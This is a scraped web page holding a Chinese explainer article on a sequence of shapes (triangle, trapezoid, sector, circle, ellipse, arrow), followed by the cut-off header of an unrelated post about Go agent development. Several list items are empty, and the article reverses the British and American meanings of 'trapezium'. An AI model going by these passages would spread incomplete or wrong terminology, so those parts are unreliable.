                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>📐➡️🪜➡️🥧➡️⭕➡️🛞➡️🧭在数学、工程、设计乃至日常生活中，几何图形不仅是抽象思维的载体，更是人类理解空间、构建结构、传递信息的重要工具。从最简单的三角形开始，经过梯形、扇形、圆形、椭圆，最终演化为具有方向意义的箭头，这一序列不仅体现了图形复杂度的递增，也反映了功能从静态描述向动态指示的转变。本文将深入探讨这些图形的定义、性质、应用场景及其相互之间的联系，力求全面而详尽。</p>
<hr/>
<h2 data-id="heading-0">📐 三角形（Triangle）</h2>
<p>三角形是由三条线段首尾相连所围成的平面图形，是最基本的多边形之一。其内角和恒为180°，这是欧几里得几何中的核心定理之一。</p>
<h3 data-id="heading-1">分类方式</h3>
<ul>
<li>
<p><strong>按边长</strong>：</p>
<ul>
<li>等边三角形（三边相等，三个角均为60°）</li>
<li>等腰三角形（两边相等，底角相等）</li>
<li>不等边三角形（三边均不相等）</li>
</ul>
</li>
<li>
<p><strong>按角度</strong>：</p>
<ul>
<li>锐角三角形（三个角均小于90°）</li>
<li>直角三角形（一个角为90°，满足勾股定理 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mn>2</mn></msup><mo>+</mo><msup><mi>b</mi><mn>2</mn></msup><mo>=</mo><msup><mi>c</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">a^2 + b^2 = c^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"/><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span>）</li>
<li>钝角三角形（一个角大于90°）</li>
</ul>
</li>
</ul>
<h3 data-id="heading-2">重要性质</h3>
<ul>
<li>
<p><strong>稳定性</strong>：三角形是唯一具有“刚性”的多边形——在不改变边长的情况下无法变形，因此广泛应用于桥梁、塔架、桁架等工程结构中。</p>
</li>
<li>
<p><strong>重心、垂心、内心、外心</strong>：三角形拥有多个特殊点，分别对应质量中心、高线交点、内切圆圆心、外接圆圆心。</p>
</li>
<li>
<p><strong>面积公式</strong>：</p>
<ul>
<li>基础公式：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo>×</mo><mtext>底</mtext><mo>×</mo><mtext>高</mtext></mrow><annotation encoding="application/x-tex">A = \frac{1}{2} \times 底 \times 高</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"/><span class="mord cjk_fallback">底</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord cjk_fallback">高</span></span></span></span></span></li>
<li/>
</ul>
</li>
</ul>
<h3 data-id="heading-3">应用领域</h3>
<ul>
<li>建筑学（屋顶结构、桁架）</li>
<li>计算机图形学（3D建模的基本单元）</li>
<li>导航与测量（三角测量法）</li>
</ul>
<hr/>
<h2 data-id="heading-4">🪜 梯形（Trapezoid / Trapezium）</h2>
<p>梯形是至少有一组对边平行的四边形。在美式英语中称为 <em>trapezoid</em>，而在英式英语中 <em>trapezium</em> 指无平行边的四边形，需注意术语差异。</p>
<h3 data-id="heading-5">定义与分类</h3>
<ul>
<li><strong>普通梯形</strong>：仅一组对边平行（称为“底”），另两边为“腰”。</li>
<li><strong>等腰梯形</strong>：非平行边（腰）长度相等，底角相等，具有对称轴。</li>
<li><strong>直角梯形</strong>：其中一个腰垂直于底边，形成两个直角。</li>
</ul>
<h3 data-id="heading-6">性质</h3>
<ul>
<li>中位线（连接两腰中点的线段）长度等于两底之和的一半。</li>
<li>面积公式：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><mfrac><mrow><mo stretchy="false">(</mo><mtext>上底</mtext><mo>+</mo><mtext>下底</mtext><mo stretchy="false">)</mo><mo>×</mo><mtext>高</mtext></mrow><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">A = \frac{(上底 + 下底) \times 高}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.355em;vertical-align:-0.345em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord cjk_fallback mtight">上底</span><span class="mbin mtight">+</span><span class="mord cjk_fallback mtight">下底</span><span class="mclose mtight">)</span><span class="mbin mtight">×</span><span class="mord cjk_fallback mtight">高</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></li>
</ul>
<h3 data-id="heading-7">应用</h3>
<ul>
<li>土木工程（堤坝横截面、渠道设计）</li>
<li>机械设计（滑块导轨、楔形结构）</li>
<li>艺术构图（营造透视感或稳定感）</li>
</ul>
<p>梯形可视为三角形的“扩展”——若将三角形顶部截去一部分，即得梯形。这种“截断”操作在几何变换中十分常见。</p>
<hr/>
<h2 data-id="heading-8">🥧 扇形（Sector of a Circle）</h2>
<p>扇形是由圆心角及其所对的弧与两条半径围成的图形，形如披萨切片，故常用🍕表示，但此处更强调其几何属性，故用🥧（派）象征。</p>
<h3 data-id="heading-9">构成要素</h3>
<ul>
<li/>
<li>圆心角 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>θ</mi></mrow><annotation encoding="application/x-tex">\theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span></span></span></span></span>（可用度数或弧度表示）</li>
<li/>
<li/>
</ul>
<h3 data-id="heading-10">特殊情形</h3>
<ul>
<li/>
<li/>
<li/>
</ul>
<h3 data-id="heading-11">应用场景</h3>
<ul>
<li>仪表盘设计（速度表、电量显示）</li>
<li>统计图表（饼图 Pie Chart 的基本单元）</li>
<li>光学（激光束发散角、照明覆盖区域）</li>
<li>机械（齿轮齿形、凸轮轮廓）</li>
</ul>
<p>扇形是从圆形“切割”而来，体现了从整体到局部的分析思维。</p>
<hr/>
<h2 data-id="heading-12">⭕ 圆形（Circle）</h2>
<p>圆形是平面上到定点（圆心）距离等于定长（半径）的所有点的集合，具有完美的对称性。</p>
<h3 data-id="heading-13">核心性质</h3>
<ul>
<li>周长：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><mn>2</mn><mi>π</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">C = 2\pi r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></span></li>
<li>面积：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><mi>π</mi><msup><mi>r</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">A = \pi r^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></li>
<li>任意直径将圆分为两个全等半圆</li>
<li>圆周角定理：同弧所对的圆周角相等，且为圆心角的一半</li>
</ul>
<h3 data-id="heading-14">对称性</h3>
<ul>
<li>无限条对称轴（每条直径都是对称轴）</li>
<li>中心对称图形</li>
</ul>
<h3 data-id="heading-15">应用</h3>
<ul>
<li>车轮（滚动摩擦最小）</li>
<li>齿轮传动（均匀受力）</li>
<li>天文轨道（理想化模型）</li>
<li>信号传播（波前呈圆形扩散）</li>
</ul>
<p>圆形是所有封闭曲线中，在给定周长下面积最大的图形（等周定理），体现了自然界的效率最优。</p>
<hr/>
<h2 data-id="heading-16">🛞 椭圆（Ellipse）</h2>
<p>椭圆是平面上到两个定点（焦点）的距离之和为常数的点的轨迹。当两焦点重合时，椭圆退化为圆形。</p>
<h3 data-id="heading-17">数学表达</h3>
<ul>
<li/>
<li/>
<li>离心率：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>=</mo><mfrac><mi>c</mi><mi>a</mi></mfrac></mrow><annotation encoding="application/x-tex">e = \frac{c}{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.0404em;vertical-align:-0.345em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span>，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>e</mi><mo>&lt;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 &lt; e &lt; 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"/><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>；<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">e=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span> 时为圆</li>
</ul>
<h3 data-id="heading-18">几何性质</h3>
<ul>
<li>两条对称轴（长轴与短轴）</li>
<li>反射性质：从一焦点发出的光线经椭圆反射后必过另一焦点（用于声学聚焦、医疗碎石）</li>
</ul>
<h3 data-id="heading-19">实际应用</h3>
<ul>
<li>行星轨道（开普勒第一定律）</li>
<li>建筑穹顶（如美国国会大厦）</li>
<li>光学镜面（椭圆反射镜）</li>
<li>工程制图（斜截圆柱的截面为椭圆）</li>
</ul>
<p>椭圆可视为圆形在某一方向上的“拉伸”或“压缩”，是仿射变换下的不变图形。</p>
<hr/>
<h2 data-id="heading-20">🧭 箭头（Arrow）</h2>
<p>箭头并非传统几何图形，而是一种<strong>符号性图形</strong>，用于表示方向、流程、趋势或指示。</p>
<h3 data-id="heading-21">结构成分</h3>
<ul>
<li><strong>杆部（Shaft）</strong> ：通常为直线或带状，表示路径或主轴。</li>
<li><strong>箭头头（Head）</strong> ：多为三角形或锥形，强调方向终点。</li>
<li>有时包含<strong>尾羽</strong>（如弓箭样式），增强视觉识别。</li>
</ul>
<h3 data-id="heading-22">类型与用途</h3>
<ul>
<li><strong>单向箭头</strong>：→ 表示单一方向（如流程图、路标）</li>
<li><strong>双向箭头</strong>：↔ 表示往返或对等关系</li>
<li><strong>弯曲箭头</strong>：↷ 表示旋转、循环或非线性过程</li>
<li><strong>粗/细箭头</strong>：表示强度、优先级或数据流大小</li>
</ul>
<h3 data-id="heading-23">设计原则</h3>
<ul>
<li><strong>清晰性</strong>：方向必须一目了然</li>
<li><strong>比例协调</strong>：箭头头不宜过大或过小</li>
<li><strong>上下文适配</strong>：在UI设计、交通标志、数学符号中风格各异</li>
</ul>
<h3 data-id="heading-24">与其他图形的联系</h3>
<ul>
<li>箭头头部常采用<strong>三角形</strong>，因其尖锐指向性强。</li>
<li>在矢量场中，箭头长度代表<strong>大小</strong>，方向代表<strong>矢量方向</strong>。</li>
<li>在时间线或流程图中，箭头连接<strong>圆形</strong>（节点）或<strong>椭圆</strong>（状态），形成信息网络。</li>
</ul>
<p>箭头标志着从<strong>静态几何</strong>向<strong>动态语义</strong>的跃迁——它不再仅仅描述“是什么”，而是说明“往哪里去”。</p>
<hr/>
<h2 data-id="heading-25">🔗 图形演进的逻辑脉络</h2>
<p>从 📐 到 🧭，这一序列隐含着人类认知与技术发展的深层逻辑：</p>
<ol>
<li><strong>构建基础</strong>（三角形）：最稳定的结构单元，支撑物理世界。</li>
<li><strong>扩展形态</strong>（梯形）：引入不对称与实用性，适应现实需求。</li>
<li><strong>引入曲线</strong>（扇形）：从直线到弧线，开启连续性思维。</li>
<li><strong>追求完美对称</strong>（圆形）：理想化的极限形式，体现自然法则。</li>
<li><strong>打破对称，拥抱真实</strong>（椭圆）：描述更复杂的自然现象（如轨道）。</li>
<li><strong>超越形状，传达意图</strong>（箭头）：图形成为信息载体，服务于沟通与控制。</li>
</ol>
<p>这一路径不仅是几何复杂度的提升，更是从<strong>存在</strong>（being）到<strong>变化</strong>（becoming）的哲学演进。</p>
<hr/>
<h2 data-id="heading-26">💎 结语</h2>
<p>无论是用于计算桥梁承重的三角形，还是指示网页“返回顶部”的小小箭头，这些图形早已融入人类文明的肌理。它们既是数学语言的字母，也是工程蓝图的像素，更是视觉传达的词汇。理解它们的定义、性质与关联，不仅有助于学术研究，更能提升我们在数字时代解读世界的能力。</p>
<p>正如古希腊人用圆规与直尺探索宇宙秩序，今天的我们，依然在这些看似简单的图形中，寻找结构、美感与真理的统一。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[go Eino使用ADK开发agent]]></title>    <link>https://juejin.cn/post/7595142737514479643</link>    <guid>https://juejin.cn/post/7595142737514479643</guid>    <pubDate>2026-01-15T05:59:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595142737514479643" data-draft-id="7595115707161804841" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="go Eino使用ADK开发agent"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-15T05:59:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户3075009303793"/> <meta itemprop="url" content="https://juejin.cn/user/4453485090705453"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            go Eino使用ADK开发agent
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4453485090705453/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户3075009303793
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T05:59:43.000Z" title="Thu Jan 15 2026 05:59:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h5 